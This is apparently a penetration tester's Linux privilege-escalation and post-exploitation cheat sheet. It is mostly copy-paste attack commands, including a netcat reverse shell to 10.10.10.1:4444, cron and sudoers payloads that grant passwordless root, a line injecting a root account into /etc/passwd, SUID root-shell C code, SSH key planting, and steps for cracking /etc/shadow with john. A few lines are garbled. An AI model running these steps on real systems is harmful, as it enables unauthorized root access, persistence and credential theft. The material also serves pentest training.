## Info-sheet

+	IP address: *target*
+	DNS-Domain name: *target-domain*
+	Host name: *host-name*
+	OS: *os*
+	Server: *web-server*
+	Kernel: *os-type*
+	Workgroup: *workgroup*
+	Linux domain: *lin-domain*
+	Kernel exploits:
+	Cleartext password:
+	Reconfigure service parameters:
+	Programs running as root:
+	Installed software:
+	Weak/reused/plaintext passwords:
+	Inside service:
+	Installed software:
+	Scheduled tasks:
+	Weak passwords:
+	Suid misconfiguration:
+	World writable scripts invoked by root:
+	Unmounted filesystems:
+	Private ssh keys:
+	Bad path configuration:
+	Cronjobs:


### Privilege escalation quick links

#### Escaping limited shells

#### Shell Exploitation

#### reverse-shell-cheat-sheet

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

#### 7 Linux Shells Using Built-in Tools

http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/          

#### Creating Metasploit Payloads

https://netsec.ws/?p=331

#### escaping restricted linux shells

https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells

#### Breaking out of rbash using scp

http://pentestmonkey.net/blog/rbash-scp

#### shellcatraz

https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells

#### escaping restricted shells

http://securebean.blogspot.ca/2014/05/escaping-restricted-shell_3.html

#### attacking restricted shells

https://blog.netspi.com/attacking-restricted-linux-shells/


### Useful commands

### Switch user to root

```
su root
```

### check user access to sudo

```
sudo -l
```
look for issues in the error codes for example

```
User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```
The flaw in the above configuration is that /account/ is appended with a *. We can exploit this to read /root/flag.txt by traversing the directories.

```
sudo cat /accounts/../root/flag.txt
```

### check user access to sudoedit

sudoedit /etc/exports


####  Spawning shell
python -c 'import pty; pty.spawn("/bin/sh")'

### you break out of the "jail" shell?

python -c 'import pty;pty.spawn("/bin/bash")'

echo os.system('/bin/bash')

/bin/sh -i

/bin/sh

exec /bin/bash

/bin/bash

/bin/ksh

/bin/zsh

/bin/dash


### Access to more binaries

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

### Set up webserver

cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

### Download all files

wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py 

unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt

python linprivchecker.py extended

./unix-privesc-check standard


### Add user to sudoers

echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

### check which version of chkrootkit
```
dpkg -l | grep chkrootkit

echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
wait some time and keep checking the file size of sudoers

then sudo su


#### Privilege escalation

Now we start the whole enumeration-process over gain.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs




### Basic info

- OS:
- Version:
- Kernel version:
- Architecture:
- Current user:

**Devtools:**
- GCC:
- NC:
- WGET:

**Users with login:**

grep -vE "nologin" /etc/passwd


#### What's the OS? What version? What architecture?

uname -a

cat /etc/issue

cat /etc/*-release

cat /etc/lsb-release      # Debian based

cat /etc/redhat-release   # Redhat based

#### What's the distribution type? What version?

cat /proc/version

uname -a

uname -mrs

rpm -q kernel

dmesg | grep Linux

ls /boot | grep vmlinuz-

#### Who are we? Where are we?

id

pwd

#### Who uses the box? What users? (And which ones have a valid shell)

cat /etc/passwd

#### look in /etc/passwd for new accounts in sorted list by UID

sort -nk3 -t: /etc/passwd | less

#### look for unexpected UID 0 accounts

egrep ':0+:' /etc/passwd

#### look for UID 0 accounts on a system with multiple authentications

getent passwd | egrep ':0+:'

#### look for orphaned files which could be a sign and attacker left something behind

find / -nouser -print 2>/dev/null

#### look at uptime

uptime

#### exssive memory use 

free

#### disk space

df

### Users with login

grep -vE "nologin" /etc/passwd

grep -vE "nologin|false" /etc/passwd

#### What's currently running on the box? What active network services are there?

ps aux

netstat -antup

#### if you spot a process that is unfamiliar, investigate in more detail using 

lsof -p [pid]

#### get details about running processes listening

lsof -i

#### check which services are enabled at various runlevels

chkconfig --list

#### What's installed? What kernel is being used?

dpkg -l (Debian based OSs)

rpm -qa (CentOS / openSUSE )

uname -a

#### What can be learnt from the enviro variables

cat /etc/profile

cat /etc/bashrc

cat ~/.bash_profile

cat ~/.bashrc

cat ~/.bash_logout

env

set


#### What services are running? Which service has which user privilege?

ps aux

ps -ef

top

cat /etc/services

ps aux | grep root

ps -ef | grep root

#### What applications are installed? What version are they? Are they currently running?
 
ls -alh /usr/bin/

ls -alh /sbin/

dpkg -l

rpm -qa

ls -alh /var/cache/apt/archivesO

ls -alh /var/cache/yum/

#### What jobs are scheduled?


crontab -u root -l

crontab -l

ls -alh /var/spool/cron

ls -al /etc/ | grep cron

ls -al /etc/cron*

cat /etc/cron*

cat /etc/at.allow

cat /etc/at.deny

cat /etc/cron.allow

cat /etc/cron.deny

cat /etc/crontab

cat /etc/crontab.*

cat /etc/anacrontab

cat /var/spool/cron/crontabs/root

#### Ask yourself can you answer the following questions

What user files do we have access to?

What configurations do we have access to?

Any incorrect file permissions?

What programs are custom? Any SUID? SGID?

What's scheduled to run?

Any hardcoded credentials? Where are credentials kept?

looking for the MySQL credential inside the web application


and now you are just getting warmed up


uname -mrs

env

cat /proc/version

cat /etc/issue

cat /etc/passwd

cat /etc/group

cat /etc/shadow

cat /etc/hosts

### What files run as root / SUID / GUID?:

```
find / -uid 0 -perm -4000 -print

find / -perm +2000 -user root -type f -print

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.

find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.

find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID

for i in `locate -r "bin*dollar-sign*"`; do find *dollar-sign*i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  

find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null


```

### What folders are world writeable?:

```
find / -writable -type d 2>/dev/null      # world-writeable folders

find / -perm -222 -type d 2>/dev/null     # world-writeable folders

find / -perm -o w -type d 2>/dev/null     # world-writeable folders

find / -perm -o x -type d 2>/dev/null     # world-executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

```

#### look for unusual large files (greater than 10 Megabytes)

find / -size + 10000k -print

#### look for files named with dots and spaces ("...","..","." and " ")

find / -name " " -print
find / -name ".. " -print
find / -name ". " -print
find / -name " " -print

#### look for processes running out of or accessing files that have been unlinked

lsof +L1

on linux with rpm installed

rpm -Va | sort

### Programs running as root

Look for webserver, mysql or anything else like that.


### Installed software

```
ls -la /usr/local/
ls -la /usr/local/src
ls -la /usr/local/bin
ls -la /opt/
ls -la /home
ls -la /var/
ls -la /usr/src/

```

#### Debian

dpkg -l

#### CentOS, OpenSuse, Fedora, RHEL

rpm -qa (CentOS / openSUSE )

#### OpenBSD, FreeBSD

pkg_info



### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

### Check plaintext

```
./LinEnum.sh -t -k password
```

### Inside service

```
netstat -anlp

netstat -ano
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
nmap
vim
nano
```

```
find / -perm -u=s -type f 2>/dev/null
```
### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l


```

### Look for NFS shares and try to mount them


```
root@kali:~# mkdir /tmp/nfs
root@kali:~# mount -t nfs *target*:/home/user /tmp/nfs
root@kali:~# cd /tmp/nfs

```
### mount access denied root squashing

https://en.wikipedia.org/wiki/Unix_security#Root_squash

http://fullyautolinux.blogspot.ca/2015/11/nfs-norootsquash-and-suid-basic-nfs.html

Pro Tip

If you have the UID and GID of a user on the server. we can create a user on our local machine with the UID 2008 and try accessing the mounted share 

```
execute sudoedit /etc/exports as root. we can disable root squashing. We can do so by replacing root_squash with no_root_squash.

```
### umount nfs shares

```
Unmount /tmp/nfs
```


### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### think about generating ssh keys on the local machine and uploading to the server

### Priv Enumeration Scripts

#### Privilege escalation recon scripts:

These are scripts that you must run on the box

http://www.securitysift.com/download/linuxprivchecker.py

http://pentestmonkey.net/tools/audit/unix-privesc-check

```

upload /unix-privesc-check

chmod u+x unix-privesx-check

./unix-privesx-check > output.txt


grep WARNING output.txt | less
```
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./

upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended

./LinEnum.sh -t -k password

unix-privesc-check


### LINUX Privilege escalation

Linux Privilege Escalation

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://www.youtube.com/watch?v=dk2wsyFiosg


### Kernel exploits

GET THE KERNAL VERSION AND SEARCH FOR PRIV ESC EXPLOITS 

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

### unsing SSH keys for exploit

1. create a user on the local kali machine with the same username as on the linux machine

on target type "id"

on kali create user
```
useradd -u 2008 vulnix
```
2. create ssh keys on local attacker machine then push them to the target adding ssh keys to authorized keys

```

On kali or attacker
root@kali:~# ls /root/.ssh/
root@kali:~# ssh-keygen
root@kali:~# ls /root/.ssh/
id_rsa  id_rsa.pub
root@kali:~# cat /root/.ssh/id_rsa.pub

on target

$ mkdir .ssh
$ cd .ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC42NpxutFyfjQuOtZRiHzS/HRgCDQZZrrmizKrLmnhWy4RbzMqFc/URB22QtHkQLnX4libQkGKaSce2bEE2mF0DKB8oX/O9L+J7BYf5d7C6UQ1fLXN1Tg3Ls4QbKBrQGKPH14rdmzSe+ESKc5fE+cvBhB7f8Ub4HnZTDhLCSLJoyzNf85BkU/QjjWymxEXaoSDhg9vPgXEeQAAUCikkpcTwE5PVGG8z+m1fR0OZnzm45sfe2b+NI18owH60oGm8n8O6jOivsvlohXpNrcCm2Ago994zVA4V9ntPd6owXb77Wu1w8Zz1x1dK79QvIook18B6SIhnjJWyFgxHox2Gg8F root@kali > authorized_keys

on kali or attacker

root@kali:~# ssh user@*target*

```

### SUID (Set owner User ID up on execution)

below are some quick copy and paste examples for various shells:


```
SUID C Shell for /bin/bash  

int main(void){  
setresuid(0, 0, 0);  
system("/bin/bash");  
}  

SUID C Shell for /bin/sh  

int main(void){  
setresuid(0, 0, 0);  
system("/bin/sh");  
}  

Building the SUID Shell binary  
gcc -o suid suid.c  
For 32 bit:  
gcc -m32 -o suid suid.c
chmod 4777 suid

```
create an SUID binary which is owned by root and which has its sticky bit set and has r/w/x permissions for all users.

```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```
```

root@kali:~/Desktop/B2R# gcc suid.c -o suid
suid.c: In function ‘main’:
suid.c:2:5: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
     setresuid(0, 0, 0);
     ^~~~~~~~~
suid.c:3:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
     system("/bin/bash");
     ^~~~~~
root@kali:~/Desktop/B2R# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...

wget http://192.168.1.13:8000/suid
```




Create and compile an SUID from a limited shell (no file transfer)

```
echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" > privsc.c gcc privsc.c -o privsc

```
Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:

```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

```
You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.

```
set PATH="/tmp:/usr/local/bin:/usr/bin:/bin" echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 > tmp/f" >> /tmp/ssh chmod +x ssh


```

### Add root user to passwd if file is writeable

echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

cat /etc/passwdcat /etc/passwd

cat /etc/group 

cat /etc/group 

cat /etc/group

grep -vE "nologin" /etc/passwd

echo test > /etc/passwd 

### edit the password file if you have r/w/x access or worldwritable

echo 'kate::0:0:kate:/bin/bash' >> /etc/passwd

cat /etc/passwd

su kate

#### use /bin/bash from the local attacker machine

If you get a nfs share you can copy over /bin/bash and execute to add the user to root group

```
first mount the remote share as per standard mount commands then from attacker machine copy bash over and apply sticky bit as root

root@kali:/tmp/nfs# cp /bin/bash /tmp/nfs/

root@kali:/tmp/nfs# chmod 4777 bash

Then ssh into the box as a standard user and run the bash command with -p

./bash: /lib/i386-linux-gnu/libtinfo.so.5: no version information available (required by ./bash)

bash-4.3# id

uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)

bash-4.3# cd /root/

```




### Bad path configuration

Require user interaction


#### POST Exploitation FOR Unix

#### unix-privesc-check

#### Linux scripts for PRIV Escalation.py, sh, pl

viper-shell/application/modules/post/Privilege-Escalation/Linux/Post Exploitation Scripts/

#### POST Exploitation FOR Linux

#### Linux

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

#### Linuxenum.sh

Located in viperhome/application/modules/post

#### Linux exploit suggester

Located in viperhome/application/modules/post

#### Linux PRIV Checker

Located in viperhome/application/modules/post

#### Linux PRIV Escalation scripts for .py, sh, pl

viper-shell/application/modules/post/Privilege-Escalation/Linux/Post Exploitation Scripts/

### escape shell commands

python -c 'import pty;pty.spawn("/bin/bash")'

echo os.system('/bin/bash')

/bin/sh -i

#### Go from rbash to bash

1.	find a file that you can write and execute to 

2.	find the tee file

3.	watch the quotes in the command below.

4.	echo '/bin/bash';|tee -a './bin/ping'

5.	echo the bin/bash shell into the ping tool and execute the ping tool

6.	basically you are appending the bin/bash to ping tool and executing

7.	cd /home

8.	now we are bash

#### try to root the server tricks

https://www.youtube.com/watch?v=SoUrcesP9ek

1.	we have to set the path for bash first

2.	export PATH=*dollar-sign*PATH:/usr/bin/

2.	no we need to search cron job, to see if anything I found is vulnerable

3.	cd /etc/cron.minutely/

4.	ls

5.	check all running cron jobs

6.	ls -ls file

7.	you need to write if not try other things

8.	cat file

9.	see if file is running other files

10.	check permissions on other files

10.	hopefully they are running as 777

11.	appended things to other files

12.	nano file

13.	do things like cp /bin/sh /home/restricted1/unkownendevice64 && chmod 4755

14.	give you root privs to run this shell


### Setting the SUID sticky bit

chmod 4755 lin86-reverse-met-603.elf

chmod s+x lin86-reverse-met-603.elf

chmod 4777 lin86-reverse-met-603.elf
------------------------------------------------------------------------

----------------------------- LOOT LOOT LOOT LOOT ----------------------

------------------------------------------------------------------------


## Loot

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:


### Proof

```
/root/proof.txt
```

### Network secret

```
/root/network-secret.txt
```

### take a screet shot


### Passwords and hashes

```
cat /etc/passwd

cat /etc/shadow

unshadow passwd shadow > unshadowed.txt

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig

ifconfig -a

arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap

tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X

tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI
If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

## How to replicate:
